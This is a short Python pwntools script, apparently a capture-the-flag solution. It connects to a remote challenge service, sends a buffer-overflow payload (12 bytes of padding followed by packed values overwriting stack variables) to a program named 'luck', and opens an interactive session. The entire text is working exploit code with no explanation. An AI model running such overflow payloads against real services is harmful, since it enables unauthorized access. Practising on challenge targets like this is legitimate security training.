#!/usr/bin/env python
# coding=utf-8
from pwn import *
ip   = '140.110.112.31'
prot = 2111
r = remote(ip, prot)
#r = process("./luck")
payload1 = p32(0xFACEB00C)
payload2 = p32(0xDEADBEEF)
set_key = p32(0x00008327) #33575
r.recvuntil("What do you want to tell me:")
r.sendline(b"A" * 12 + payload1 + payload2 + set_key)
r.recvuntil("password:")
print("key_is: {}".format(u32(set_key)))
r.interactive()
